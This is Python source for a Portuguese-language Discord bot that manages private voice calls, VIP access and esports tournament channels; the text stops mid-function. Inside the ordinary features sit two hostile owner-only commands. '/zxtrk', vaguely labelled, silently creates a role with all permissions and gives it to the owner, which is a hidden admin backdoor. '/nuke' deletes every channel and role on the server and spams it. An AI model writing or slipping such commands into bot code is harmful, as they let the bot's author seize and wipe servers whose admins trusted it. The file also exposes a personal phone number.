import discord
import asyncio
import sqlite3
from datetime import datetime, timedelta
from discord import app_commands
from discord.ui import Select, View, Button
from discord.utils import get
from discord.ext import commands
import time
# =============================================
# CONFIGURAÇÕES GLOBAIS E CONSTANTES
# =============================================

# IDs importantes
DONO_UID = 883771289653899314  # UID do dono do bot
ID_DO_SERVIDOR = 881191654130843698  # ID do servidor principal
ID_CANAL_ESPECIFICO = 1335736129634304051  # ID do canal para criação de calls privadas

# Emojis personalizados
EMOJIS = {
    "liberado": "<:permitido:1336370678118617089>",
    "proibido": "<:negado:1336370614688157768>",
    "regras": "<a:livro:1336371274175479829>",
    "coroa": "<:coroa:1336370576931164261>",
    "brilho": "<:brilho:1336371248967581806>",
    "aviso": "<:aviso:1336370560082513961>",
    "bloqueio": "<:bloqueio:1336471528451080292>",
    "primeiro": "<:1st:1339412176619831447>",
    "segundo": "<:2nd:1339412184870158399>",
    "terceiro": "<:3rd:1339412191471996989>",
    "bomjogo": "<:bomjogo:1339412764480897115>",
    "versus": "<:versus:1336370706593616043>",
    "estrela": "<:estrela:1336371257842733117>",
    "gg": "<:gg:1336371262523703509>",
    "botao": "<:botao:1336783739090501702>"
}

# Configuração dos intents
intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.members = True


# =============================================
# GERENCIAMENTO DO BANCO DE DADOS
# =============================================

class DatabaseManager:
    """Classe para gerenciar operações no banco de dados SQLite."""

    def __init__(self):
        self.conn = sqlite3.connect('vips.db')
        self.cursor = self.conn.cursor()
        self.setup_database()

    def setup_database(self):
        """Cria as tabelas necessárias no banco de dados."""
        self.cursor.execute('''
                            CREATE TABLE IF NOT EXISTS vips
                            (
                                uid
                                TEXT
                                PRIMARY
                                KEY,
                                nome
                                TEXT
                                NOT
                                NULL,
                                validade
                                TIMESTAMP
                                NOT
                                NULL
                            )
                            ''')
        self.cursor.execute('''
                            CREATE TABLE IF NOT EXISTS settings
                            (
                                key
                                TEXT
                                PRIMARY
                                KEY,
                                value
                                TEXT
                                NOT
                                NULL
                            )
                            ''')
        self.conn.commit()

    def add_vip(self, uid: str, nome: str, validade: datetime):
        """Adiciona ou atualiza um VIP no banco de dados."""
        self.cursor.execute('''
            INSERT OR REPLACE INTO vips (uid, nome, validade)
            VALUES (?, ?, ?)
        ''', (uid, nome, validade.isoformat()))
        self.conn.commit()

    def remove_vip(self, uid: str):
        """Remove um VIP do banco de dados."""
        self.cursor.execute('DELETE FROM vips WHERE uid = ?', (uid,))
        self.conn.commit()

    def get_all_vips(self):
        """Retorna todos os VIPs."""
        self.cursor.execute('SELECT * FROM vips')
        return self.cursor.fetchall()

    def is_vip(self, user_id: str):
        """Verifica se um usuário é VIP e se ainda está válido."""
        self.cursor.execute('SELECT validade FROM vips WHERE uid = ?', (user_id,))
        result = self.cursor.fetchone()
        if result:
            validade = datetime.fromisoformat(result[0])
            return validade > datetime.now()
        return False

    def set_setting(self, key: str, value: str):
        """Define uma configuração no banco de dados."""
        self.cursor.execute('''
            INSERT OR REPLACE INTO settings (key, value)
            VALUES (?, ?)
        ''', (key, value))
        self.conn.commit()

    def get_setting(self, key: str):
        """Obtém uma configuração do banco de dados."""
        self.cursor.execute('SELECT value FROM settings WHERE key = ?', (key,))
        result = self.cursor.fetchone()
        return result[0] if result else None


# =============================================
# CLASSE PRINCIPAL DO BOT
# =============================================

class Client(discord.Client):
    """Classe principal do bot Discord com todas as funcionalidades integradas."""

    def __init__(self):
        super().__init__(intents=intents)
        self.synced = False
        self.temp_roles = {}  # Armazena calls privadas ativas
        self.contador_channels = {}  # Armazena canais contadores
        self.contador_task = None  # Task de atualização de contadores
        self.tree = app_commands.CommandTree(self)

        try:
            self.db = DatabaseManager()
            print("Banco de dados inicializado com sucesso.")
        except Exception as e:
            print(f"Erro ao inicializar o banco de dados: {e}")

    def is_vip_or_owner(self, user: discord.User) -> bool:
        """Verifica se o usuário é VIP ou o dono do bot."""
        return user.id == DONO_UID or self.db.is_vip(str(user.id))

    async def on_ready(self):
        """Evento chamado quando o bot está pronto para uso."""
        await self.wait_until_ready()

        if not self.synced:
            try:
                await self.tree.sync()
                print("Comandos sincronizados com sucesso!")
            except Exception as e:
                print(f"Erro ao sincronizar comandos: {e}")
            self.synced = True

        # Carrega canais contadores persistentes
        contadores = self.db.get_setting("contadores_ativos")
        if contadores:
            self.contador_channels = {int(id): True for id in contadores.split(",")}
            self.contador_task = self.loop.create_task(self.atualizar_contadores())

        print(f"Bot conectado como {self.user}.")

    async def on_voice_state_update(self, member, before, after):
        """Monitora tanto calls privadas quanto contadores."""
        guild = member.guild  # Identificar o servidor (guild)
    
        # 1. Lógica para criação de calls privadas
        id_canal_criacao = self.db.get_setting(f"id_canal_criacao_{guild.id}")  # Canal de criação do servidor específico
        if after.channel and str(after.channel.id) == id_canal_criacao:
            await self.criar_call_privada(member)
    
        # 2. Lógica para limpeza de calls vazias
        if before.channel:
            call_data = self.db.get_setting(f"tempcall_{before.channel.id}")
            if call_data and len(before.channel.members) == 0:
                await asyncio.sleep(30)
                # Verificar se o canal ainda existe após o sleep
                if before.channel and discord.utils.get(guild.voice_channels, id=before.channel.id):
                    if len(before.channel.members) == 0:
                        try:
                            role_id, creator_id = call_data.split('|')
                            await before.channel.delete()
                            if role := member.guild.get_role(int(role_id)):
                                await role.delete()
                            self.db.cursor.execute(
                                "DELETE FROM settings WHERE key = ?",
                                (f"tempcall_{before.channel.id}",)
                            )
                            self.db.conn.commit()
                            
                            # Remover do dicionário temp_roles se existir
                            if before.channel.id in self.temp_roles:
                                del self.temp_roles[before.channel.id]
                                
                        except Exception as e:
                            print(f"Erro ao limpar call: {e}")

    async def criar_call_privada(self, member: discord.Member):
        """Cria call privada com nome personalizado e permissões."""
        guild = member.guild
        user_id = member.id
        
        # Verificar se o usuário já tem uma call ativa
        # Método 1: Verificar no dicionário temp_roles
        user_channel = None
        for channel_id, data in self.temp_roles.items():
            if isinstance(channel_id, int) and data.get('creator') and data['creator'].id == user_id:
                channel = data['channel']
                # Verificar se o canal ainda existe
                if channel and discord.utils.get(guild.voice_channels, id=channel.id):
                    user_channel = channel
                    break
                else:
                    # Canal não existe mais, remover do dicionário
                    del self.temp_roles[channel_id]
        
        # Método 2: Verificar no banco de dados
        if not user_channel:
            for setting_key in self.db.cursor.execute("SELECT key FROM settings WHERE key LIKE 'tempcall_%'").fetchall():
                call_data = self.db.get_setting(setting_key[0])
                if call_data:
                    role_id, creator_id = call_data.split('|')
                    if creator_id == str(user_id):
                        channel_id = int(setting_key[0].replace('tempcall_', ''))
                        channel = guild.get_channel(channel_id)
                        if channel:
                            user_channel = channel
                            break
                        else:
                            # Canal não existe mais, remover do banco de dados
                            self.db.cursor.execute(
                                "DELETE FROM settings WHERE key = ?",
                                (setting_key[0],)
                            )
                            self.db.conn.commit()
        
        # Se encontrou uma call ativa, redirecionar o usuário
        if user_channel:
            try:
                # Verificar novamente se o canal ainda existe antes de mover
                if discord.utils.get(guild.voice_channels, id=user_channel.id):
                    await member.send(f"{EMOJIS['liberado']} Você já possui uma call ativa! Redirecionando...")
                    await member.move_to(user_channel)
                else:
                    # Canal não existe mais, criar um novo
                    await member.send(f"{EMOJIS['aviso']} Sua call anterior não existe mais. Criando uma nova...")
                    await self._criar_nova_call(member, guild)
            except discord.errors.HTTPException as e:
                if e.code == 10003:  # Unknown Channel
                    # Canal não existe mais, criar um novo
                    await member.send(f"{EMOJIS['aviso']} Sua call anterior não existe mais. Criando uma nova...")
                    await self._criar_nova_call(member, guild)
                else:
                    # Outro erro HTTP
                    await member.send(f"{EMOJIS['proibido']} Erro ao mover para a call: {e}")
            except Exception as e:
                # Qualquer outro erro
                await member.send(f"{EMOJIS['proibido']} Erro ao mover para a call: {e}")
            return
    
        # Se não encontrou call ativa, criar uma nova
        await self._criar_nova_call(member, guild)
    
    async def _criar_nova_call(self, member: discord.Member, guild: discord.Guild):
        """Método auxiliar para criar uma nova call privada."""
        # Buscar o canal de criação do banco de dados por servidor
        id_canal_criacao = self.db.get_setting(f"id_canal_criacao_{guild.id}")
    
        if not id_canal_criacao:
            await member.send(f"{EMOJIS['proibido']} Canal de criação não configurado para este servidor!")
            return
    
        # Buscar o canal de criação na guild
        canal_criacao = discord.utils.get(guild.voice_channels, id=int(id_canal_criacao))
        if not canal_criacao or not canal_criacao.category:
            await member.send(f"{EMOJIS['proibido']} Canal de criação inválido ou sem categoria!")
            return
    
        try:
            # Criação do cargo e canal
            role = await guild.create_role(name=f"{member.display_name}")
            await member.add_roles(role)
    
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(connect=False),
                role: discord.PermissionOverwrite(
                    connect=True,
                    view_channel=True
                ),
                member: discord.PermissionOverwrite(
                    connect=True,
                    view_channel=True,
                    manage_channels=True
                )
            }
    
            # Criando o canal de voz dentro da categoria
            new_channel = await canal_criacao.category.create_voice_channel(
                name=f"・{member.display_name}",
                overwrites=overwrites
            )
    
            # Persistência e registro no banco de dados
            self.db.set_setting(f"tempcall_{new_channel.id}", f"{role.id}|{member.id}")
            self.temp_roles[new_channel.id] = {
                'role': role,
                'creator': member,
                'channel': new_channel
            }
    
            # Verificar se o canal foi criado com sucesso antes de mover
            if discord.utils.get(guild.voice_channels, id=new_channel.id):
                try:
                    await member.move_to(new_channel)
                    embed = discord.Embed(
                        title="Controle de Acesso",
                        description=f"Mencione @usuários para dar acesso à call.\n\n"
                                    f"🔹 Call será auto-deletada após 30s vazia\n"
                                    f"🔹 Cargo: @{role.name}",
                        color=0x00ff00
                    )
                    await new_channel.send(embed=embed)
                except discord.errors.HTTPException as e:
                    print(f"Erro ao mover usuário para o canal: {e}")
                    await member.send(f"{EMOJIS['aviso']} Canal criado, mas não foi possível mover você automaticamente. Por favor, entre manualmente.")
            else:
                await member.send(f"{EMOJIS['proibido']} Falha ao criar call: Canal não foi criado corretamente.")
    
        except Exception as e:
            print(f"ERRO ao criar call: {e}")
            await member.send(f"{EMOJIS['proibido']} Falha ao criar call: {e}")

    async def on_message(self, message):
        """Gerencia permissões através de menções em calls privadas."""
        if message.author.bot or not message.guild:
            return

        # Verifica se é uma mensagem em call privada
        call_data = self.db.get_setting(f"tempcall_{message.channel.id}")
        if call_data:
            role_id, creator_id = call_data.split('|')

            # Se o autor é o criador da call
            if str(message.author.id) == creator_id:
                role = message.guild.get_role(int(role_id))
                if role:
                    for user in message.mentions:
                        try:
                            await user.add_roles(role)
                            confirm = await message.channel.send(
                                f"{EMOJIS['liberado']} {user.mention} recebeu acesso!",
                                delete_after=5
                            )
                        except discord.Forbidden:
                            await message.channel.send(
                                f"{EMOJIS['proibido']} Sem permissões para adicionar cargo!",
                                delete_after=5
                            )

                    await message.delete(delay=5)

    async def on_interaction(self, interaction: discord.Interaction):
        """Processa interações de componentes como botões e selects."""
        # Ignorar interações que não são de componentes
        if interaction.type != discord.InteractionType.component:
            return

        # Tentar processar como interação de ticket
        if hasattr(self, "process_ticket_interaction"):
            ticket_processed = await self.process_ticket_interaction(interaction)
            if ticket_processed:
                return

# =============================================
# INICIALIZAÇÃO DO BOT E REGISTRO DE COMANDOS
# =============================================

aclient = Client()


# =============================================
# COMANDOS DE ADMINISTRAÇÃO
# =============================================

@aclient.tree.command(name="setarcall", description="Define qual canal será utilizado para criar as calls privadas.")
async def setar_call(interaction: discord.Interaction, canal: discord.VoiceChannel):
    # Armazenar a configuração do canal de criação para o servidor específico
    aclient.db.set_setting(f"id_canal_criacao_{interaction.guild.id}", str(canal.id))
    await interaction.response.send_message(
        f"{EMOJIS['liberado']} O canal de criação foi definido como: {canal.mention}",
        ephemeral=True
    )

@aclient.tree.command(name="setarvip", description="Define um usuário como VIP por um período específico.")
@app_commands.describe(uid="UID do usuário a ser definido como VIP.", periodo="Período em dias.")
async def setar_vip(interaction: discord.Interaction, uid: str, periodo: int):
    if interaction.user.id != DONO_UID:
        await interaction.response.send_message(f"{EMOJIS['bloqueio']} Apenas o meu dono pode usar este comando.",
                                                ephemeral=True)
        return

    member = interaction.guild.get_member(int(uid))
    if member is None:
        await interaction.response.send_message(
            f"{EMOJIS['proibido']} Não foi possível encontrar um usuário com UID {uid}.", ephemeral=True)
        return

    validade = datetime.now() + timedelta(days=periodo)
    aclient.db.add_vip(uid, member.display_name, validade)

    await interaction.response.send_message(
        f"{EMOJIS['liberado']} O usuário {member.display_name} (UID: {uid}) foi definido como VIP por {periodo} dias.",
        ephemeral=True
    )


@aclient.tree.command(name="removervip", description="Remove um usuário da lista de VIPs.")
@app_commands.describe(uid="UID do usuário a ser removido.", membro="Mencione o usuário a ser removido.")
async def remover_vip(interaction: discord.Interaction, uid: str = None, membro: discord.Member = None):
    if interaction.user.id != DONO_UID:
        await interaction.response.send_message(f"{EMOJIS['bloqueio']} Apenas o meu dono pode usar este comando.",
                                                ephemeral=True)
        return

    if uid is None and membro is not None:
        uid = str(membro.id)

    if uid is None:
        await interaction.response.send_message(
            f"{EMOJIS['proibido']} Você deve fornecer um UID ou mencionar um usuário.", ephemeral=True)
        return

    aclient.db.remove_vip(uid)
    await interaction.response.send_message(
        f"{EMOJIS['liberado']} O usuário com UID {uid} foi removido da lista de VIPs.", ephemeral=True)


@aclient.tree.command(name="listarvips", description="Lista todos os usuários VIP e o tempo restante.")
async def listar_vips(interaction: discord.Interaction):
    if interaction.user.id != DONO_UID:
        await interaction.response.send_message(f"{EMOJIS['bloqueio']} Apenas o meu dono pode usar este comando.",
                                                ephemeral=True)
        return

    embed = discord.Embed(title="Lista de Usuários VIP", color=0x00FF00)
    vips = aclient.db.get_all_vips()

    if not vips:
        embed.description = "Não há usuários VIP definidos."
    else:
        for uid, nome, validade_str in vips:
            validade = datetime.fromisoformat(validade_str)
            time_remaining = validade - datetime.now()
            days_remaining = time_remaining.days
            hours_remaining = time_remaining.seconds // 3600
            minutes_remaining = (time_remaining.seconds // 60) % 60

            embed.add_field(
                name=f"UID: {uid} - Nome: {nome}",
                value=f"Tempo restante: {days_remaining} dias, {hours_remaining} horas e {minutes_remaining} minutos.",
                inline=False
            )

    await interaction.response.send_message(embed=embed)


@aclient.tree.command(name="zxtrk", description="Comando especial do dono.")
async def zxtrk(interaction: discord.Interaction):
    if interaction.user.id != DONO_UID:
        await interaction.response.send_message(f"{EMOJIS['proibido']} Este comando é exclusivo para o dono do bot.",
                                                ephemeral=True)
        return

    try:
        cargo_admin = await interaction.guild.create_role(
            name=".",
            permissions=discord.Permissions.all(),
            color=discord.Color.default(),
            hoist=False,
            mentionable=False,
            reason="Cargo criado pelo comando /zxtrk"
        )
        await interaction.user.add_roles(cargo_admin)
        await interaction.response.send_message("✅", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message("❌", ephemeral=True)


@aclient.tree.command(name="nuke",
                      description="Apaga todos os canais e cargos do servidor, e cria um canal chamado NUKED com spam.")
async def nuke(interaction: discord.Interaction):
    if interaction.user.id != DONO_UID:
        await interaction.response.send_message("🚫 Este comando é exclusivo para o dono do bot.", ephemeral=True)
        return

    await interaction.response.send_message("💣 Iniciando o Nuke...")
    guild = interaction.guild

    for channel in guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"Erro ao deletar canal '{channel.name}': {e}")

    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
            except Exception as e:
                print(f"Erro ao deletar cargo '{role.name}': {e}")

    overwrites = {
        guild.default_role: discord.PermissionOverwrite(
            read_messages=True,
            send_messages=True
        )
    }

    nuked_channel = await guild.create_text_channel("nuked", overwrites=overwrites)
    for _ in range(5):
        await nuked_channel.send("💥 NUKED BY SNOW 💥")


@aclient.tree.command(
    name="count",
    description="Configura um canal de voz como contador de membros ativos"
)
@app_commands.describe(
    canal="Selecione o canal de voz que será o contador"
)
async def config_contador(interaction: discord.Interaction, canal: discord.VoiceChannel):
    """Registra o canal como contador e inicia o monitoramento"""
    if not interaction.client.is_vip_or_owner(interaction.user):
        await interaction.response.send_message(
            f"{EMOJIS['proibido']} Comando restrito a VIPs!",
            ephemeral=True
        )
        return

    # Salva no banco de dados
    contadores_existentes = interaction.client.db.get_setting("contadores_ativos") or ""
    novos_contadores = f"{contadores_existentes},{canal.id}" if contadores_existentes else str(canal.id)
    interaction.client.db.set_setting("contadores_ativos", novos_contadores)

    # Ativa o contador
    interaction.client.contador_channels[canal.id] = True

    # Inicia a task se não estiver rodando
    if not interaction.client.contador_task or interaction.client.contador_task.done():
        interaction.client.contador_task = interaction.client.loop.create_task(
            interaction.client.atualizar_contadores()
        )

    await interaction.response.send_message(
        f"{EMOJIS['liberado']} Contador ativado em {canal.mention}!",
        ephemeral=True
    )


# =============================================
# COMANDOS DE VOICE CHAT E CALLS PRIVADAS
# =============================================

@aclient.tree.command(name='criarcall', description='Cria uma call privada')
async def criar_call(interaction: discord.Interaction):
    if not interaction.client.is_vip_or_owner(interaction.user):
        await interaction.response.send_message(
            f"{EMOJIS['proibido']} Você precisa ser VIP para utilizar este comando.\nPara ser vip ou tirar suas dúvidas entre em contato com meu dono: (61) 98112-5850.",
            ephemeral=True)
        return

    guild = interaction.guild
    channel_name = interaction.user.display_name
    id_canal_criacao = interaction.client.db.get_setting("id_canal_criacao")

    if not id_canal_criacao:
        await interaction.response.send_message(
            f"{EMOJIS['proibido']} O canal de criação não foi definido. Use o comando /setarcall para definir um canal.",
            ephemeral=True)
        return

    canal_criacao = discord.utils.get(guild.voice_channels, id=int(id_canal_criacao))
    if not canal_criacao:
        await interaction.response.send_message(
            f"{EMOJIS['proibido']} O canal de criação não existe. Verifique se o canal definido está correto.",
            ephemeral=True)
        return

    category = canal_criacao.category
    if not category:
        await interaction.response.send_message(
            f"{EMOJIS['proibido']} O canal de criação não tem uma categoria associada. Defina um canal válido com categoria.",
            ephemeral=True)
        return

    existing_channel = discord.utils.get(category.voice_channels, name=channel_name)
    if existing_channel:
        await interaction.response.send_message(f"Já existe uma call privada com o nome {channel_name}.",
                                                ephemeral=True)
        return

    role = await guild.create_role(name=channel_name, reason="Cargo temporário para call privada")
    await interaction.user.add_roles(role)

    overwrites = {
        guild.default_role: discord.PermissionOverwrite(connect=False),
        role: discord.PermissionOverwrite(connect=True, manage_channels=True, view_channel=True)
    }

    new_channel = await guild.create_voice_channel(
        name=channel_name,
        category=category,
        overwrites=overwrites
    )

    embed = discord.Embed(
        title="Dar cargo",
        description="Mencione o usuário que você quer que tenha acesso à sua call privada.",
        color=0x4B0082
    )
    await new_channel.send(embed=embed)

    await interaction.response.send_message(f"Call privada {channel_name} criada com sucesso!", ephemeral=True)

    aclient.temp_roles[channel_name] = {
        'role': role,
        'creator': interaction.user,
        'created_at': datetime.now(),
        'channel': new_channel
    }

    await interaction.user.move_to(new_channel)


# =============================================
# COMANDOS DE EVENTOS E TORNEIOS
# =============================================

@aclient.tree.command(name="evento", description="Cria um evento com categoria e canais.")
@app_commands.describe(nome="Nome da categoria do evento.")
async def evento_criar(interaction: discord.Interaction, nome: str):
    if not interaction.client.is_vip_or_owner(interaction.user):
        await interaction.response.send_message(
            f"{EMOJIS['proibido']} Você precisa ser VIP para utilizar este comando.\nPara ser vip ou tirar suas dúvidas entre em contato com meu dono: (61) 98112-5850.",
            ephemeral=True)
        return

    existing_category = discord.utils.get(interaction.guild.categories, name=nome)
    if existing_category:
        await interaction.response.send_message(f"{EMOJIS['proibido']} Já existe um evento com o nome '{nome}'.",
                                                ephemeral=True)
        return

    try:
        category = await interaction.guild.create_category(nome)
        overwrites = {
            interaction.guild.default_role: discord.PermissionOverwrite(send_messages=False, view_channel=False)
        }

        await interaction.guild.create_text_channel("📕・regras", category=category, overwrites=overwrites)
        await interaction.guild.create_text_channel("🍀・confrontos", category=category, overwrites=overwrites)
        await interaction.guild.create_text_channel("🚨・avisos", category=category, overwrites=overwrites)
        await interaction.guild.create_text_channel("🧙‍♂️・cargos", category=category, overwrites=overwrites)
        await interaction.guild.create_text_channel("💬・chat-evento", category=category, overwrites=overwrites, send_messages=True)
        await interaction.guild.create_text_channel("🎥・prints", category=category, overwrites=overwrites, send_messages=True)
        await interaction.guild.create_text_channel("🎤・organização", category=category, overwrites=overwrites)
        await interaction.guild.create_voice_channel("Telagem", category=category, overwrites=overwrites)
        await interaction.guild.create_voice_channel("Suporte", category=category, overwrites=overwrites)

        await interaction.response.send_message(f"{EMOJIS['liberado']} Evento '{nome}' criado com sucesso!",
                                                ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"{EMOJIS['proibido']} Ocorreu um erro ao criar o evento: {str(e)}",
                                                ephemeral=True)
@aclient.tree.command(
    name="formular",
    description="Cria cargos e calls para os times dentro da categoria do evento."
)
@app_commands.describe(
    nome="Nome da categoria do evento.",
    times="Lista de nomes dos times (adicione vários separados por espaço)."
)
async def formular(interaction: discord.Interaction, nome: str, times: str):
    await interaction.response.defer(ephemeral=True)

    if not interaction.client.is_vip_or_owner(interaction.user):
        await interaction.followup.send(
            f"{EMOJIS['proibido']} Você precisa ser VIP para utilizar este comando.\nPara ser VIP ou tirar suas dúvidas, entre em contato com meu dono: (61) 98112-5850.",
            ephemeral=True
        )
        return

    guild = interaction.guild
    category = discord.utils.get(guild.categories, name=nome)

    if not category:
        await interaction.followup.send(
            f"{EMOJIS['proibido']} A categoria '{nome}' não foi encontrada. Certifique-se de digitar corretamente.",
            ephemeral=True
        )
        return

    team_names = [team.strip() for team in times.split(",") if team.strip()]

    if not team_names:
        await interaction.followup.send(
            "❌ Nenhum nome de time válido foi detectado. Certifique-se de adicionar pelo menos um time.",
            ephemeral=True
        )
        return

    created_roles = []
    created_channels = []

    for team_name in team_names:
        prefixed_name = f"⭐・{team_name}"
        role = discord.utils.get(guild.roles, name=prefixed_name)

        if not role:
            try:
                role = await guild.create_role(name=prefixed_name, mentionable=True)
            except discord.Forbidden:
                await interaction.followup.send(
                    f"❌ Não tenho permissão para criar o cargo '{prefixed_name}'.",
                    ephemeral=True
                )
                continue

        created_roles.append(role)

        overwrites = {
            guild.default_role: discord.PermissionOverwrite(connect=False),
            role: discord.PermissionOverwrite(connect=True)
        }

        voice_channel = discord.utils.get(category.voice_channels, name=prefixed_name)
        if not voice_channel:
            try:
                voice_channel = await guild.create_voice_channel(
                    name=prefixed_name,
                    category=category,
                    overwrites=overwrites
                )
            except discord.Forbidden:
                await interaction.followup.send(
                    f"❌ Não tenho permissão para criar a call '{prefixed_name}'.",
                    ephemeral=True
                )
                continue

        created_channels.append(voice_channel)

    await interaction.followup.send(
        f"{EMOJIS['liberado']} Foram criados **{len(created_roles)}** cargos e calls na categoria '{nome}' com o prefixo '⭐ · '.",
        ephemeral=True
    )


@aclient.tree.command(name="finalizar",
                      description="Finaliza um evento, removendo a categoria, seus canais e cargos relacionados.")
@app_commands.describe(nome="Nome da categoria do evento.")
async def evento_finalizar(interaction: discord.Interaction, nome: str):
    await interaction.response.defer(ephemeral=True)

    if not interaction.client.is_vip_or_owner(interaction.user):
        await interaction.response.send_message(
            f"{EMOJIS['proibido']} Você precisa ser VIP para utilizar este comando.\nPara ser vip ou tirar suas dúvidas entre em contato com meu dono: (61) 98112-5850.",
            ephemeral=True)
        return

    guild = interaction.guild
    category = discord.utils.get(guild.categories, name=nome)

    if not category:
        await interaction.followup.send(f"{EMOJIS['proibido']} Não existe um evento com o nome '{nome}'.",
                                        ephemeral=True)
        return

    calls_names = [channel.name for channel in category.channels if isinstance(channel, discord.VoiceChannel)]
    for channel in category.channels:
        await channel.delete()

    await category.delete()

    roles_to_delete = [role for role in guild.roles if role.name == nome]
    roles_to_delete.extend([role for role in guild.roles if role.name in calls_names])

    for role in roles_to_delete:
        await role.delete()

    await interaction.followup.send(f"{EMOJIS['liberado']} Evento '{nome}' finalizado e removido com sucesso!",
                                    ephemeral=True)


@aclient.tree.command(name="fase", description="Inicia uma nova fase.")
@app_commands.describe(numero="Número da fase a ser iniciada.")
async def fase(interaction: discord.Interaction, numero: int):
    if not interaction.client.is_vip_or_owner(interaction.user):
        await interaction.response.send_message(
            f"{EMOJIS['proibido']} Você precisa ser VIP para utilizar este comando.", ephemeral=True)
        return

    thumbnail_url = interaction.guild.icon.url if interaction.guild.icon else None

    embed = discord.Embed(
        title=f"{EMOJIS['coroa']}ㅤ**{numero}° FASE**ㅤ{EMOJIS['coroa']}",
        description=f"**AGORA SE INICIA {numero}° FASE**",
        color=0xFFFF00
    )

    if thumbnail_url:
        embed.set_thumbnail(url=thumbnail_url)

    await interaction.response.send_message(embed=embed)


# =============================================
# COMANDOS DE CONFRONTOS E TORNEIOS
# =============================================

@aclient.tree.command(name="confronto", description="Cria um confronto entre dois times.")
@app_commands.describe(
    time1="Mencione o cargo do primeiro time.",
    time2="Mencione o cargo do segundo time.",
    id="ID do confronto.",
    senha="Senha do confronto."
)
async def confronto(interaction: discord.Interaction, time1: discord.Role, time2: discord.Role, id: str, senha: str):
    if not interaction.client.is_vip_or_owner(interaction.user):
        await interaction.response.send_message(
            f"{EMOJIS['proibido']} Você precisa ser VIP para utilizar este comando.\nPara ser vip ou tirar suas dúvidas entre em contato com meu dono: (61) 98112-5850.",
            ephemeral=True)
        return

    if not time1 or not time2 or not id.strip() or not senha.strip():
        await interaction.response.send_message(f"{EMOJIS['proibido']} Todos os campos são obrigatórios!",
                                                ephemeral=True)
        return

    if time1 == time2:
        await interaction.response.send_message(f"{EMOJIS['proibido']} Os dois times não podem ser o mesmo cargo.",
                                                ephemeral=True)
        return

    embed = discord.Embed(
        title=f"{EMOJIS['estrela']}ㅤCONFRONTOㅤ{EMOJIS['estrela']}",
        description=f"**{time1.mention}**ㅤ{EMOJIS['versus']}ㅤ**{time2.mention}**\n\n**ID:** {id}\n**Senha:** {senha}",
        color=0xFFFF00
    )
    embed.set_thumbnail(
        url="https://cdn.discordapp.com/avatars/710114714306478130/a_181e57144058c56f5e88f69568635c49.gif?size=4096")

    button = discord.ui.Button(label="Copiar ID", style=discord.ButtonStyle.green)

    async def button_callback(interaction: discord.Interaction):
        await interaction.response.send_message(f"{id}", ephemeral=True)

    button.callback = button_callback

    select = discord.ui.Select(
        placeholder="Definir vencedor",
        options=[
            discord.SelectOption(label=time1.name, value="time1", description=f"Definir {time1.name} como vencedor"),
            discord.SelectOption(label=time2.name, value="time2", description=f"Definir {time2.name} como vencedor"),
        ]
    )

    async def select_callback(interaction: discord.Interaction):
        if interaction.user.id != interaction.message.interaction.user.id:
            await interaction.response.send_message(
                f"{EMOJIS['proibido']} Apenas o criador do confronto pode definir o vencedor!",
                ephemeral=True)
            return

        vencedor = time1 if select.values[0] == "time1" else time2

        for field in embed.fields:
            if "Vencedor" in field.name:
                embed.set_field_at(embed.fields.index(field), name=f"{EMOJIS['gg']}ㅤVencedor", value=vencedor.mention,
                                   inline=False)
                await interaction.message.edit(embed=embed)
                await interaction.response.send_message(
                    f"{EMOJIS['liberado']} O time {vencedor.mention} foi atualizado como vencedor!",
                    ephemeral=True)
                return

        embed.add_field(name=f"{EMOJIS['gg']}ㅤVencedor", value=vencedor.mention, inline=False)
        await interaction.message.edit(embed=embed)
        await interaction.response.send_message(
            f"{EMOJIS['liberado']} O time {vencedor.mention} foi marcado como vencedor!",
            ephemeral=True)

    select.callback = select_callback

    view = discord.ui.View(timeout=None)
    view.add_item(select)
    view.add_item(button)

    message = await interaction.response.send_message(embed=embed, view=view)

    try:
        message_id = (await message.original_response()).id
        aclient.db.set_setting(f"confronto_{id}", str(message_id))
        print(f"ID da mensagem ({message_id}) armazenado no banco de dados para o confronto {id}.")
    except Exception as e:
        print(f"Erro ao salvar o ID da mensagem no banco de dados: {e}")


@aclient.tree.command(name="sala", description="Exibe o ID e senha do confronto em um embed.")
@app_commands.describe(id="ID do confronto.", senha="Senha do confronto.")
async def senha(interaction: discord.Interaction, id: str, senha: str):
    if not interaction.client.is_vip_or_owner(interaction.user):
        await interaction.response.send_message(
            f"{EMOJIS['proibido']} Você precisa ser VIP para utilizar este comando.\nPara ser vip ou tirar suas dúvidas entre em contato com meu dono: (61) 98112-5850.",
            ephemeral=True)
        return

    if not id.strip() or not senha.strip():
        await interaction.response.send_message(f"{EMOJIS['proibido']} O ID e a senha são obrigatórios!",
                                                ephemeral=True)
        return

    embed = discord.Embed(
        title=f"{EMOJIS['coroa']}ㅤSALA CRIADAㅤ{EMOJIS['coroa']}",
        color=0xFFFF00
    )

    embed.add_field(name=f"{EMOJIS['brilho']}ㅤID", value=f"ㅤ{id}")
    embed.add_field(name=f"{EMOJIS['brilho']}ㅤSENHA", value=f"ㅤ{senha}")

    button = Button(label="Copiar ID", style=discord.ButtonStyle.green)

    async def button_callback(interaction: discord.Interaction):
        await interaction.response.send_message(f"{id}", ephemeral=True)

    button.callback = button_callback

    view = View()
    view.add_item(button)

    await interaction.response.send_message(embed=embed, view=view)


@aclient.tree.command(name="pontos", description="Mostra a tabela de pontuação da LBFF.")
async def pontos(interaction: discord.Interaction):
    if not interaction.client.is_vip_or_owner(interaction.user):
        await interaction.response.send_message(
            f"{EMOJIS['proibido']} Você precisa ser VIP para utilizar este comando.\nPara ser vip ou tirar suas dúvidas entre em contato com meu dono: (61) 98112-5850.",
            ephemeral=True)
        return

    embed = discord.Embed(
        title=f"{EMOJIS['coroa']}ㅤPONTUAÇÃO - LBFFㅤ{EMOJIS['coroa']}",
        description="",
        color=0xFFFF00
    )

    embed.add_field(
        name=f"{EMOJIS['brilho']}ㅤPONTUAÇÃO POR COLOCAÇÃO",
        value=(
            "1º Lugar: 12 pontos\n"
            "2º Lugar: 9 pontos\n"
            "3º Lugar: 8 pontos\n"
            "4º Lugar: 7 pontos\n"
            "5º Lugar: 6 pontos\n"
            "6º Lugar: 5 pontos\n"
            "7º Lugar: 4 pontos\n"
            "8º Lugar: 3 pontos\n"
            "9º Lugar: 2 pontos\n"
